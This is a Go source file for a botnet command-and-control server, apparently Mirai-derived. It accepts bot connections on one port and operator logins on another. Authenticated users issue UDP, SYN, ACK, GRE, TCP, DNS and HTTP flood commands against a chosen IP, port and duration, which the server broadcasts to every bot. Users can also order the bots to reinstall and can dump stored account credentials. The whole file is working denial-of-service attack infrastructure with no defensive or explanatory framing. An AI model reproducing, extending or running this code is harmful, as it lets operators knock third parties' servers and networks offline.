package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

const (
	cncBindAddr  = "0.0.0.0"
	nodeBindAddr = "0.0.0.0"
	cncPort      = "420"
	nodePort     = "7002"
	maxFds       = 100
	charset      = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
)

type session struct {
	conn net.Conn
	acct Account
	last time.Time
}

type job struct {
	method string
	target string
	port   string
	length time.Duration
	began  time.Time
}

type dbEntry struct {
	Username string `json:"Username"`
	Password string `json:"Password"`
	Expire   string `json:"Expire"`
	Level    string `json:"Level"`
}

var activeJobs = make(map[net.Conn]job)

var (
	nBots    int
	botsLock sync.Mutex
	nodePtrs []*net.Conn
)

type node struct {
	arch string
	conn net.Conn
}

var (
	nodes    []node
	sessions []*session
	maxJobs  = 3
)

func main() {
	if _, err := os.ReadFile("users.json"); err != nil {
		pw, err := randStr(12)
		if err != nil {
			fmt.Println("failed generating pw:", err)
			return
		}
		root := Account{
			Username: "root",
			Password: pw,
			Expire:   time.Now().AddDate(111, 111, 111),
			Level:    "Owner",
		}
		raw, err := json.Marshal([]Account{root})
		if err != nil {
			fmt.Println("marshal err:", err)
			return
		}
		if err := os.WriteFile("users.json", raw, 0777); err != nil {
			fmt.Println("write err:", err)
			return
		}
		fmt.Println("[☾☼☽] Login with username", root.Username, "and password", root.Password)
	}

	fmt.Println("[☾☼☽] CnC server started on", cncBindAddr+":"+cncPort)
	cncLn, err := net.Listen("tcp", cncBindAddr+":"+cncPort)
	if err != nil {
		fmt.Println("cnc listen err:", err)
		return
	}
	defer cncLn.Close()

	fmt.Println("[☾☼☽] Bot server started on", nodeBindAddr+":"+nodePort)
	nodeLn, err := net.Listen("tcp", nodeBindAddr+":"+nodePort)
	if err != nil {
		fmt.Println("node listen err:", err)
		return
	}
	defer nodeLn.Close()

	go refreshHeaders()

	go func() {
		for {
			c, err := cncLn.Accept()
			if err != nil {
				fmt.Println("accept err (cnc):", err)
				continue
			}
			fmt.Println("[☾☼☽] [User] Connected To Login Port:", c.RemoteAddr())
			go connHandler(c)
		}
	}()

	for {
		c, err := nodeLn.Accept()
		if err != nil {
			fmt.Println("accept err (node):", err)
			continue
		}
		nodePtrs = append(nodePtrs, &c)
		fmt.Println("[☾☼☽] Bot connected From", c.RemoteAddr())
		go botSession(c)
	}
}

func refreshHeaders() {
	for {
		for _, s := range sessions {
			go func(s *session) {
				spin := []rune{'∴', '∵'}
				idx := 0
				for {
					n := len(activeJobs)
					t := fmt.Sprintf("    [%c]  Servers: %d | Attacks: %d/%d |  ☾☼☽  | User: %s [%c]",
						spin[idx], numBots(), n, maxJobs, s.acct.Username, spin[idx])
					writeTitle(s.conn, t)
					idx = (idx + 1) % len(spin)
					time.Sleep(time.Second)
				}
			}(s)
		}
		time.Sleep(2 * time.Second)
	}
}

func login(conn net.Conn) (bool, *session) {
	for attempt := 0; attempt < 3; attempt++ {
		conn.Write([]byte("\033[0m"))
		conn.Write([]byte("\r\n\r\n\r\n\r\n\r\n\r\n\r\n"))
		conn.Write([]byte("\r                        \033[38;5;109m► Auth\033[38;5;146ment\033[38;5;182micat\033[38;5;218mion -- \033[38;5;196mReq\033[38;5;161muir\033[38;5;89med\n"))
		conn.Write([]byte("\033[0m\r                       ☉ Username\033[38;5;62m: "))
		user, _ := readLine(conn)
		conn.Write([]byte("\033[0m\r                       ☉ Password\033[38;5;62m: \033[38;5;255m\033[48;5;255m"))
		pass, _ := readLine(conn)
		conn.Write([]byte("\033[0m\033[2J\033[3J"))

		if ok, acct := checkCreds(user, pass); ok {
			s := &session{conn: conn, acct: *acct}
			sessions = append(sessions, s)
			return true, s
		}
	}
	conn.Close()
	return false, nil
}

func readLine(conn net.Conn) (string, error) {
	line, err := bufio.NewReader(conn).ReadString('\n')
	if err != nil {
		println(err.Error())
		return line, err
	}
	line = strings.TrimRight(line, "\r\n")
	return line, nil
}

func broadcast(cmd string) {
	for _, np := range nodePtrs {
		_, err := (*np).Write([]byte(cmd + "\r\n"))
		fmt.Println("[Command]: " + cmd + "\r")
		if err != nil {
			fmt.Println("broadcast write err:", err)
		}
	}
}

func keepAlive(conn net.Conn, done <-chan struct{}) {
	tick := time.NewTicker(5 * time.Second)
	defer tick.Stop()
	for {
		select {
		case <-tick.C:
			if _, err := conn.Write([]byte("PING\n")); err != nil {
				fmt.Println("ping err:", err)
				return
			}
		case <-done:
			fmt.Println("keepalive stopped")
			return
		}
	}
}

func connHandler(conn net.Conn) {
	conn.Write([]byte(titleEsc("☾☼☽")))
	first, err := bufio.NewReader(conn).ReadString('\n')
	if err != nil {
		println(err.Error())
		return
	}

	if strings.HasPrefix(first, "PONG") {
		for _, nd := range nodes {
			nd.conn.Write([]byte("PING"))
		}
		arch := strings.Split(first, ":")[1]
		nodes = append(nodes, node{arch: arch, conn: conn})
		for {
			msg, err := bufio.NewReader(conn).ReadString('\v')
			if err != nil {
				return
			}
			if !strings.HasPrefix(msg, "!") {
				continue
			}
			msg = strings.TrimPrefix(msg, "!")
			skip := []string{"/exe", ": directory not empty", ".ssh from the device",
				"data from the device", "usrmode from the device", ": permission denied",
				": operation not permitted", "device or resource busy"}
			ignored := false
			for _, s := range skip {
				if strings.Contains(msg, s) {
					ignored = true
					break
				}
			}
			if ignored {
				continue
			}
			args := strings.SplitN(msg, " ", 1)
			println(strings.TrimPrefix(msg, "LOG"))
			if args[0] == "LOG" && len(args) > 1 {
				println(args[1])
			}
		}
	}

	if strings.HasPrefix(first, "loginforme") {
		ok, _ := login(conn)
		if !ok {
			return
		}
		conn.Write([]byte("\033[0m\r                           \033[38;5;15m\033[38;5;118m✅ Authentication Successful\n"))
		for {
			conn.Write([]byte("\n\r\033[38;5146m[\033[38;5;161mPro\033[38;5;89mmpt\033[38;5;146m]\033[38;5;82m► \033[0m"))

			input, err := bufio.NewReader(conn).ReadString('\n')
			if err != nil {
				if err == io.EOF {
					return
				}
				fmt.Printf("read err: %v\n", err)
				conn.Close()
				return
			}
			input = strings.TrimRight(input, "\r\n")

			parts := strings.Fields(input)
			if len(parts) == 0 {
				continue
			}

			switch strings.ToLower(parts[0]) {
			case "!udpflood", "!udpsmart", "!tcpflood", "!synflood", "!ackflood", "!greflood", "!dns", "!http":
				if len(parts) < 4 {
					conn.Write([]byte("Usage: method ip port duration\r\n"))
					continue
				}
				m, ip, p, d := parts[0], parts[1], parts[2], parts[3]
				dur, err := time.ParseDuration(d + "s")
				if err != nil {
					conn.Write([]byte("Invalid duration format.\r\n"))
					continue
				}
				conn.Write([]byte(fmt.Sprintf("\r\nhost: %s\r\nport: %s\r\nlength: %s\r\nmethod: %s\r\n\r\n", ip, p, d, m)))

				activeJobs[conn] = job{method: m, target: ip, port: p, length: dur, began: time.Now()}

				go func(c net.Conn, j job) {
					time.Sleep(j.length)
					delete(activeJobs, c)
					c.Write([]byte("Attack has automatically finished and was removed.\n"))
				}(conn, activeJobs[conn])

				broadcast(fmt.Sprintf("%s %s %s %s", m, ip, p, d))

			case "ongoing":
				if j, ok := activeJobs[conn]; ok {
					rem := time.Until(j.began.Add(j.length))
					if rem > 0 {
						conn.Write([]byte(fmt.Sprintf("  | Ongoing | Method: %s | IP: %s | Port: %s | Duration: %d Sec's|\n",
							j.method, j.target, j.port, int(rem.Seconds()))))
					} else {
						delete(activeJobs, conn)
						conn.Write([]byte("Attack has finished.\n"))
					}
				} else {
					conn.Write([]byte("No ongoing attack found.\n"))
				}

			case "bots", "bot":
				conn.Write([]byte(fmt.Sprintf("\033[38;5;27m[\033[38;5;15mBots\033[38;5;73m: \033[38;5;15m%d \033[38;5;27m] \n\r", numBots())))

			case "cls", "clear":
				conn.Write([]byte("\033[2J\033[H"))

			case "logout", "exit":
				conn.Write([]byte("\033[38;5;27mLogging out...\n\r"))
				conn.Close()
				return

			case "!reinstall":
				broadcast("!reinstall")

			case "help":
				conn.Write([]byte("\x1b[38;5;231m -> [ bots, clear, help, db ] \n\r"))

			case "db":
				raw, err := os.ReadFile("./users.json")
				if err != nil {
					conn.Write([]byte(fmt.Sprintf("open err: %v\r\n", err)))
					return
				}
				var entries []dbEntry
				if err := json.Unmarshal(raw, &entries); err != nil {
					conn.Write([]byte(fmt.Sprintf("parse err: %v\r\n", err)))
					return
				}
				for _, e := range entries {
					conn.Write([]byte(fmt.Sprintf("credentials: Username: %s, Password: %s, Expire: %s, Level: %s\r\n",
						e.Username, e.Password, e.Expire, e.Level)))
				}

			case "?":
				for _, m := range []string{"!udpsmart", "!udpflood", "!tcpflood", "!synflood", "!ackflood", "!greflood", "!dns"} {
					conn.Write([]byte(m + "\n\r"))
				}

			default:
				fmt.Printf("Received input: '%s'\n", input)
				conn.Write([]byte("Invalid command.\n\r"))
			}
		}
	}
}

func numBots() int {
	botsLock.Lock()
	defer botsLock.Unlock()
	return nBots
}

func addBot() {
	botsLock.Lock()
	nBots++
	botsLock.Unlock()
}

func removeBot() {
	botsLock.Lock()
	nBots--
	botsLock.Unlock()
}

func botSession(conn net.Conn) {
	defer conn.Close()
	addBot()
	defer removeBot()

	stop := make(chan struct{})
	defer close(stop)

	go keepAlive(conn, stop)
	go miraiRecv(conn)

	sc := bufio.NewScanner(conn)
	for sc.Scan() {
	}
	if err := sc.Err(); err != nil {
		fmt.Println("bot read err:", err)
	}
}

func miraiRecv(conn net.Conn) {
	buf := make([]byte, 1024)
	for {
		n, err := conn.Read(buf)
		if err != nil {
			return
		}
		buf = buf[:n]
		if buf[0] == 0 && buf[1] == 0 && buf[2] == 0 && buf[3] > 1 {
			tmp := make([]byte, 2)
			for {
				if err := conn.SetDeadline(time.Now().Add(180 * time.Second)); err != nil {
					return
				}
				if nr, err := conn.Read(tmp); err != nil || nr != len(tmp) {
					return
				}
			}
		}
		time.Sleep(time.Second)
	}
}
